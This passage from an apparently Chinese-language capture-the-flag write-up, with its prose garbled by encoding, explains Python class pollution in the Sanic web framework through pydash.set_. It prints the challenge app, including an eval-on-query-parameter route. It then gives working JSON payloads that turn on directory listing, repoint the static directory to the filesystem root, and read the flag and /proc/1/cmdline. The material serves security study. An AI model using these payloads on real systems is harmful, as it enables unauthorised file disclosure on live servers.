</span></span><span class="line"><span class="cl">        <span class="n">directory_handler</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">DirectoryHandler</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;Register a root to serve files from. The input can either be a file or a directory.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">        This method provides an easy and simple way to set up the route necessary to serve static files.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">        Args:
</span></span></span><span class="line"><span class="cl"><span class="s2">            uri (str): URL path to be used for serving static content.
</span></span></span><span class="line"><span class="cl"><span class="s2">            file_or_directory (Union[PathLike, str]): Path to the static file
</span></span></span><span class="line"><span class="cl"><span class="s2">                or directory with static files.
</span></span></span><span class="line"><span class="cl"><span class="s2">            pattern (str, optional): Regex pattern identifying the valid
</span></span></span><span class="line"><span class="cl"><span class="s2">                static files. Defaults to `r&#34;/?.+&#34;`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            use_modified_since (bool, optional): If true, send file modified
</span></span></span><span class="line"><span class="cl"><span class="s2">                time, and return not modified if the browser&#39;s matches the
</span></span></span><span class="line"><span class="cl"><span class="s2">                server&#39;s. Defaults to `True`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            use_content_range (bool, optional): If true, process header for
</span></span></span><span class="line"><span class="cl"><span class="s2">                range requests and sends  the file part that is requested.
</span></span></span><span class="line"><span class="cl"><span class="s2">                Defaults to `False`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            stream_large_files (Union[bool, int], optional): If `True`, use
</span></span></span><span class="line"><span class="cl"><span class="s2">                the `StreamingHTTPResponse.file_stream` handler rather than
</span></span></span><span class="line"><span class="cl"><span class="s2">                the `HTTPResponse.file handler` to send the file. If this
</span></span></span><span class="line"><span class="cl"><span class="s2">                is an integer, it represents the threshold size to switch
</span></span></span><span class="line"><span class="cl"><span class="s2">                to `StreamingHTTPResponse.file_stream`. Defaults to `False`,
</span></span></span><span class="line"><span class="cl"><span class="s2">                which means that the response will not be streamed.
</span></span></span><span class="line"><span class="cl"><span class="s2">            name (str, optional): User-defined name used for url_for.
</span></span></span><span class="line"><span class="cl"><span class="s2">                Defaults to `&#34;static&#34;`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            host (Optional[str], optional): Host IP or FQDN for the
</span></span></span><span class="line"><span class="cl"><span class="s2">                service to use.
</span></span></span><span class="line"><span class="cl"><span class="s2">            strict_slashes (Optional[bool], optional): Instruct Sanic to
</span></span></span><span class="line"><span class="cl"><span class="s2">                check if the request URLs need to terminate with a slash.
</span></span></span><span class="line"><span class="cl"><span class="s2">            content_type (Optional[str], optional): User-defined content type
</span></span></span><span class="line"><span class="cl"><span class="s2">                for header.
</span></span></span><span class="line"><span class="cl"><span class="s2">            apply (bool, optional): If true, will register the route
</span></span></span><span class="line"><span class="cl"><span class="s2">                immediately. Defaults to `True`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            resource_type (Optional[str], optional): Explicitly declare a
</span></span></span><span class="line"><span class="cl"><span class="s2">                resource to be a `&#34;file&#34;` or a `&#34;dir&#34;`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            index (Optional[Union[str, Sequence[str]]], optional): When
</span></span></span><span class="line"><span class="cl"><span class="s2">                exposing against a directory, index is  the name that will
</span></span></span><span class="line"><span class="cl"><span class="s2">                be served as the default file. When multiple file names are
</span></span></span><span class="line"><span class="cl"><span class="s2">                passed, then they will be tried in order.
</span></span></span><span class="line"><span class="cl"><span class="s2">            directory_view (bool, optional): Whether to fallback to showing
</span></span></span><span class="line"><span class="cl"><span class="s2">                the directory viewer when exposing a directory. Defaults
</span></span></span><span class="line"><span class="cl"><span class="s2">                to `False`.
</span></span></span><span class="line"><span class="cl"><span class="s2">            directory_handler (Optional[DirectoryHandler], optional): An
</span></span></span><span class="line"><span class="cl"><span class="s2">                instance of DirectoryHandler that can be used for explicitly
</span></span></span><span class="line"><span class="cl"><span class="s2">                controlling and subclassing the behavior of the default
</span></span></span><span class="line"><span class="cl"><span class="s2">                directory handler.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">        Returns:
</span></span></span><span class="line"><span class="cl"><span class="s2">            List[sanic.router.Route]: Routes registered on the router.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">        Examples:
</span></span></span><span class="line"><span class="cl"><span class="s2">            Serving a single file:
</span></span></span><span class="line"><span class="cl"><span class="s2">            ```python
</span></span></span><span class="line"><span class="cl"><span class="s2">            app.static(&#39;/foo&#39;, &#39;path/to/static/file.txt&#39;)
</span></span></span></code></pre></td></tr></table>
</div>
</div><pre><code>        Serving all files from a directory:
        ```python
        app.static('/static', 'path/to/static/directory')
        ```

        Serving large files with a specific threshold:
        ```python
        app.static('/static', 'path/to/large/files', stream_large_files=1000000)
        ```
    &quot;&quot;&quot;  # noqa: E501
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">‰∏ªË¶ÅÊòØËøô‰∏™Ê≥®Èáä</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">‚Äã</span><span class="o">```</span><span class="n">python</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nf">directory_view</span><span class="w"> </span><span class="p">(</span><span class="kt">bool</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">):</span><span class="w"> </span><span class="n">Whether</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">fallback</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">showing</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">the</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">viewer</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">exposing</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">directory</span><span class="p">.</span><span class="w"> </span><span class="n">Defaults</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">to</span><span class="w"> </span><span class="o">`</span><span class="no">False</span><span class="o">`</span><span class="p">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nf">directory_handler</span><span class="w"> </span><span class="p">(</span><span class="n">Optional</span><span class="p">[</span><span class="n">DirectoryHandler</span><span class="p">],</span><span class="w"> </span><span class="n">optional</span><span class="p">):</span><span class="w"> </span><span class="n">An</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">instance</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">DirectoryHandler</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">explicitly</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">controlling</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">subclassing</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">behavior</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">default</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">directory</span><span class="w"> </span><span class="n">handler</span><span class="p">.</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Â§ßËá¥ÊÑèÊÄùÂ∞±ÊòØdirectory_view‰∏∫TrueÊó∂Ôºå‰ºöÂºÄÂêØÂàóÁõÆÂΩïÂäüËÉΩÔºådirectory_handler‰∏≠ÂèØ‰ª•Ëé∑ÂèñÊåáÂÆöÁöÑÁõÆÂΩï</p>
<p>Ë∑üËøõdirectory_handler</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">directory_handler</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">directory_handler</span> <span class="o">=</span> <span class="n">DirectoryHandler</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="n">uri</span><span class="o">=</span><span class="n">uri</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">directory</span><span class="o">=</span><span class="n">file_or_directory</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">directory_view</span><span class="o">=</span><span class="n">directory_view</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">index</span><span class="o">=</span><span class="n">index</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë∑üËøõDirectoryHandlerËøô‰∏™Á±ª</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DirectoryHandler</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Serve files from a directory.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    Args:
</span></span></span><span class="line"><span class="cl"><span class="s2">        uri (str): The URI to serve the files at.
</span></span></span><span class="line"><span class="cl"><span class="s2">        directory (Path): The directory to serve files from.
</span></span></span><span class="line"><span class="cl"><span class="s2">        directory_view (bool): Whether to show a directory listing or not.
</span></span></span><span class="line"><span class="cl"><span class="s2">        index (Optional[Union[str, Sequence[str]]]): The index file(s) to
</span></span></span><span class="line"><span class="cl"><span class="s2">            serve if the directory is requested. Defaults to None.
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">uri</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">directory</span><span class="p">:</span> <span class="n">Path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">directory_view</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">index</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">Union</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Sequence</span><span class="p">[</span><span class="nb">str</span><span class="p">]]]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">index</span> <span class="o">=</span> <span class="p">[</span><span class="n">index</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">index</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">index</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">base</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">directory</span> <span class="o">=</span> <span class="n">directory</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">directory_view</span> <span class="o">=</span> <span class="n">directory_view</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">index</span> <span class="o">=</span> <span class="nb">tuple</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êàë‰ª¨Âè™ÈúÄË¶ÅÊäädirectoryÊ±°ÊüìÊàêÊ†πÁõÆÂΩïÔºådirectory_viewÊ±°ÊüìÊàêTrueÂ∞±ËÉΩÁúãÂà∞Ê†πÁõÆÂΩïÊñá‰ª∂‰∫Ü</p>
<p>Êú¨Âú∞Ëµ∑‰∏Ä‰∏™Ë∞ÉËØï</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic</span> <span class="kn">import</span> <span class="n">Sanic</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic.response</span> <span class="kn">import</span> <span class="n">text</span><span class="p">,</span> <span class="n">html</span>
</span></span><span class="line"><span class="cl"><span class="c1">#from sanic_session import Session</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pydash</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pydash==5.1.2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pollute</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Sanic</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">static</span><span class="p">(</span><span class="s2">&#34;/static/&#34;</span><span class="p">,</span> <span class="s2">&#34;./static/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Session(app)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])</span>
</span></span><span class="line"><span class="cl"><span class="c1">#async def index(request):</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#return html(open(&#39;static/index.html&#39;).read())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#@app.route(&#34;/login&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#async def login(request):</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#user = request.cookies.get(&#34;user&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#if user.lower() == &#39;adm;n&#39;:</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#request.ctx.session[&#39;admin&#39;] = True</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#return text(&#34;login success&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#return text(&#34;login fail&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/src&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">src</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">eval</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;gxngxngxn&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/admin&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">admin</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">key</span> <span class="ow">and</span> <span class="n">value</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span> <span class="ow">and</span> <span class="s1">&#39;_.&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pollute</span> <span class="o">=</span> <span class="n">Pollute</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">pydash</span><span class="o">.</span><span class="n">set_</span><span class="p">(</span><span class="n">pollute</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;success&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;forbidden&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#print(app.router.name_index[&#39;name&#39;].directory_view)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁªèËøáÊü•ËØ¢ËµÑÊñôÂèØ‰ª•ÂèëÁé∞ÔºåËøô‰∏™Ê°ÜÊû∂ÂèØ‰ª•ÈÄöËøá**app.router.name_index[&lsquo;xxxxx&rsquo;]**Êù•Ëé∑ÂèñÊ≥®ÂÜåÁöÑË∑ØÁî±ÔºåÊàë‰ª¨ÂèØ‰ª•ÊâìÂç∞ÁúãÁúã</p>
<p>ÂõûÊòæË∑ØÁî±<code>&quot;__mp_main__.static&quot;</code></p>
<p>Êé•‰∏ãÊù•ÊÄé‰πàË∞ÉÁî®Âà∞<code>DirectoryHandler</code>ÈáåÂë¢? Êàë‰ª¨ÂèØ‰ª•ÂÖ®Â±ÄÊêúÁ¥¢‰∏ã<code>name_index</code>Ëøô‰∏™ÊñπÊ≥ï</p>
<p>Âä®Ë∞ÉÂèØ‰ª•ÂèëÁé∞ÂèØ‰ª•‰ªéhandlerÂÖ•ÊâãÔºå‰∏ÄÁõ¥ÂèØ‰ª•Ëé∑ÂèñÂà∞DirectoryHandler‰∏≠ÁöÑdirectoryÂíådirectory_view</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&#34;,&#34;value&#34;: true}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ê≥®ÊÑèËøôÈáå‰∏çËÉΩÁî®[]Êù•ÂåÖË£πÂÖ∂‰∏≠ÁöÑÁ¥¢ÂºïÔºåÊ±°ÊüìÂíåÁõ¥Êé•Ë∞ÉÁî®‰∏çÂêåÔºåÊàë‰ª¨ÈúÄË¶ÅÁî®.Êù•ËøûÊé•ÔºåËÄå<code>__mp_main.static</code>ÊòØ‰∏Ä‰∏™Êï¥‰ΩìÔºå‰∏çËÉΩÂàÜÂºÄÔºåÊàë‰ª¨ÂèØ‰ª•Áî®‰∏§‰∏™ÂèçÊñúÊù†Êù•ËΩ¨‰πâÂ∞±Â§ü‰∫Ü,ÂèØ‰ª•ÁúãÂà∞ÊòØÊ±°ÊüìÊàêÂäü‰∫ÜÔºåËÆøÈóÆ/static/ÔºåÂèØ‰ª•ÁúãÂà∞ËØ•ÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂</p>
<p>Êé•‰∏ãÊù•Â∞±ÊòØÊ±°Êüìdirectory,Â¶ÇÊûúÁõ¥Êé•Ê±°Êüì‰ºö500Ôºå‰∏çËÉΩÁõ¥Êé•Ê±°ÊüìÊàêÂ≠óÁ¨¶‰∏≤ÔºåÊàë‰ª¨Ë¶ÅÊâæÂà∞ÂÆÉÊòØ‰ªÄ‰πàÁ±ªÂûãÁöÑ</p>
<p>Ë∑üËøõÂâç‰∏ã<code>DirectoryHandler</code>Á±ª‰∏ãÈù¢ÁöÑpath</p>
<p>ÂèØ‰ª•ÁúãÂà∞partsÁöÑÂÄºÊúÄÂêéÊòØÁªô‰∫Ü_partsËøô‰∏™Â±ûÊÄßÔºåÊàë‰ª¨ËÆøÈóÆËøô‰∏™Â±ûÊÄßËøîÂõû‰∏Ä‰∏™ÂàóË°®</p>
<p>ÈÇ£‰πà‰∏äÈù¢ÁöÑÊ±°ÊüìÁõ¥Êé•Ê±°ÊüìÊàêÂàóË°®Â∞±Ë°å‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&#34;,&#34;value&#34;: [&#34;/&#34;]}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÜçËÆøÈóÆstaticÁõÆÂΩïÂ∞±ËÉΩÁúãÂà∞flagÂêç‰∫Ü</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328231419772.png"
	width="1374"
	height="880"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328231419772_hu11988532794304519502.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328231419772_hu2484384366744870379.png 1024w"
	loading="lazy"
	
		alt="image-20250328231419772"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="374px"
	
></p>
<p>Áî®‰∏äÈù¢ÊñπÊ≥ïÊ±°ÊüìËØªflag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;.__init__\\\\.__globals__\\\\.__file__&#34;,&#34;value&#34;: &#34;/24bcbd0192e591d6ded1_flag&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="dasctf-2024ÊöëÊúüÊåëÊàòËµõ‰∏∫ÁÉ≠Áà±Âπ∂ËÇ©‰ΩúÊàòsanics-revenge">[DASCTF 2024ÊöëÊúüÊåëÊàòËµõÔΩú‰∏∫ÁÉ≠Áà±ÔºåÂπ∂ËÇ©‰ΩúÊàò]Sanic&rsquo;s revenge
</h3><p>‰∏äÈù¢Ë∑üÁùÄgxngxngxnÂ∏àÂÇÖÁöÑÂçöÂÆ¢ÊâìÁöÑÔºå‰ªñÂèëÁé∞‰∏ãÈù¢Ëøô‰∏™<code>file_or_directory</code>ÂèØ‰ª•Ê±°ÊüìÔºåÂÉèflask‰∏≠ÁöÑ**_static_url_path**,Ê±°Êüì‰∫Ü‰ª•ÂêéÂèØ‰ª•ÈÄöËøáË∑ØÁî±Áõ¥Êé•ËÆøÈóÆÂà∞Êñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&#34;,&#34;value&#34;: &#34;/&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÖàÁî®polluteË∑ØÁî±Ê±°Êüì</p>
<p>ËØª<code>/static/proc/1/cmdline</code></p>
<p>ÁúãÂà∞start.sh</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328233322716.png"
	width="1693"
	height="635"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328233322716_hu6311031930619990102.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328233322716_hu14498926232631167562.png 1024w"
	loading="lazy"
	
		alt="image-20250328233322716"
	
	
		class="gallery-image" 
		data-flex-grow="266"
		data-flex-basis="639px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
